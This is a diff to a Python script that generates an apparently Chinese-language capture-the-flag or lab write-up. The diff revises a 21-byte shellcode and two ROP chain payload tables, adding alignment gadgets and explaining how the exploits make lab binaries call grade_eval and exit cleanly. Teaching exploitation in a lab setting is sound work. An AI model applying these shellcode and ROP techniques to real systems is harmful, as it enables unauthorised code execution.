@@ -782,16 +782,21 @@ def build(ev):
     code(doc, ev["fixed_maps"])
     picture(doc, os.path.join(FIGS, "fig_fixed_stack.png"), 6.4, "图 2  dark-calc 的固定栈映射：rwxp 栈页 + 两侧守卫页")
     code(doc, ev["wrap_entry"])
-    heading(doc, "8.2 shellcode：15 字节，把预算花在刀刃上", 2)
-    code(doc, "6a 04          push 4\n"
-              "5f             pop  rdi                ; edi = 4\n"
-              "48 b8 <a87…>   movabs rax, 0x401a87     ; grade_eval\n"
-              "ff e0          jmp   rax               ; 注意：是 jmp，不是 call")
-    para(doc, "为什么是 jmp 不是 call？shellcode 入口时 rsp=0x721000800ff0，距守卫页只剩 8 字节"
-              "可写；call 会压栈，grade_eval 的 prologue 再来一个 push 就撞墙。jmp 不碰栈，"
-              "grade_eval 自己 push rbp 恰好落在 0x…fe8——守卫页下方最后一格。它返回时从 "
-              "0x…ff0 弹出我放在偏移 32 处的 0x4019b9（mov edi,0; call exit@plt），"
-              "进程 exit(0)，干净离场。")
+    heading(doc, "8.2 shellcode：21 字节，把预算花在刀刃上", 2)
+    code(doc, "b8 87 1a 40 00  mov  eax, 0x401a87        ; grade_eval（非 PIE 下 32 位即完整地址）\n"
+              "6a 04          push 4\n"
+              "5f             pop  rdi                    ; edi = 4\n"
+              "2d ce 00 00 00  sub  eax, 0xce             ; eax = 0x4019b9（input 的 exit(0) 调用点）\n"
+              "50             push rax                    ; 把 exit0 作为 grade_eval 的返回地址压栈\n"
+              "05 ce 00 00 00  add  eax, 0xce             ; eax 恢复为 0x401a87\n"
+              "ff e0          jmp  rax                    ; 进 grade_eval")
+    para(doc, "两处设计都踩在预算上：其一，非 PIE 主映像所有代码地址都 < 2^32，用 mov eax 加 "
+              "sub/add 的 32 位立即数形式，比 movabs 短，21 字节就装下「设参 + 调函数 + 干净退出」"
+              "三件事（仍塞进 24 字节的 expression+saved rbp 槽）。其二，进 grade_eval 前先 "
+              "push rax（=exit0）：这既是给 grade_eval 安排的返回地址，更关键的是把 rsp 下移一个 "
+              "qword——jmp 进入时 grade_eval 的 rsp%16 恰好等于 8，与正常 call 的约定一致，其内部 "
+              "printf 的 movaps 不会因未对齐崩掉（对任意 glibc 稳健）。grade_eval 打印并 fflush 后 "
+              "ret，从栈顶弹出 exit0 调用点（mov edi,0; call exit@plt），进程 exit(0)，干净离场。")
     heading(doc, "8.3 实测：字节流在固定栈上活了过来", 2)
     code(doc, ev["shellcode_inspect"])
     code(doc, ev["grade_hit"])
@@ -828,14 +833,18 @@ def build(ev):
               ["0 – 23", "'R' × 24", "覆盖 expression[16] 与 saved rbp"],
               ["24 – 31", "0x401a33", "pop rdi; ret"],
               ["32 – 39", "0x0000000000000004", "rdi = 4（grade）"],
-              ["40 – 47", "0x401978", "grade_eval"],
-              ["48 – 55", "0x4018aa", "mov edi,0; call exit@plt → exit(0)"],
+              ["40 – 47", "0x401a34", "裸 ret——栈对齐垫片"],
+              ["48 – 55", "0x401978", "grade_eval"],
+              ["56 – 63", "0x4018aa", "mov edi,0; call exit@plt → exit(0)"],
           ],
           widths=[2.2, 6.2, 8.6], mono_cols=(1,))
-    para(doc, "对齐演算：input 的 ret 之后 rsp%16=0；pop rdi 弹掉一项后 rsp%16=8；再 ret 进入 "
-              "grade_eval 时 rsp%16=8，与正常 call 一模一样——所以它内部 printf 的 movaps 不会"
-              "因未对齐崩掉。grade_eval 是普通函数，自带 canary 建立与校验，链里没有任何一步"
-              "碰它的帧。整条链只用固定代码地址，对栈随机化、libc 地址完全免疫。")
+    para(doc, "对齐演算（为什么中间要垫一个裸 ret）：input 的 ret 之后 rsp%16=0，进入 pop rdi；"
+              "pop rdi 弹掉参数 4 后 rsp%16=8；pop rdi 尾部的 ret 弹到垫片 ret，此时 rsp%16=0；"
+              "垫片 ret 再弹到 grade_eval，此时 rsp%16=8——与正常 call 的入口约定完全一致，所以 "
+              "它内部 printf 的 movaps 不会因未对齐崩掉（对任意 glibc 稳健）。若省掉这个垫片，"
+              "grade_eval 会以 rsp%16=0 进入，严格 glibc 上 printf 可能直接崩溃。grade_eval 是"
+              "普通函数，自带 canary 建立与校验，链里没有任何一步碰它的帧。整条链只用固定代码"
+              "地址，对栈随机化、libc 地址完全免疫。")
     heading(doc, "9.3 实测", 2)
     code(doc, "Enter an expression (length up to 15):\n\n Hope A will be your grade! \n"
               "target exit status: 0   PASS（期望字符串命中）")
@@ -868,8 +877,9 @@ def build(ev):
               ["0 – 7", "'K' × 8", "fake saved rbp"],
               ["8 – 15", "0x4018a3", "pop rdi; ret（csu 尾部 41 5f c3 的第 2 字节）"],
               ["16 – 23", "4", "rdi = 4"],
-              ["24 – 31", "0x401677", "grade_eval"],
-              ["32 – 255", "'L' 填充", "凑到 len 字段之前"],
+              ["24 – 31", "0x4018a4", "裸 ret——栈对齐垫片"],
+              ["32 – 39", "0x401677", "grade_eval"],
+              ["40 – 255", "'L' 填充", "凑到 len 字段之前"],
               ["256 – 259", "0xa0 00 00 00", "len = 160 → memcpy 目的地 = rbp"],
           ],
           widths=[2.4, 4.2, 10.4], mono_cols=(1,))
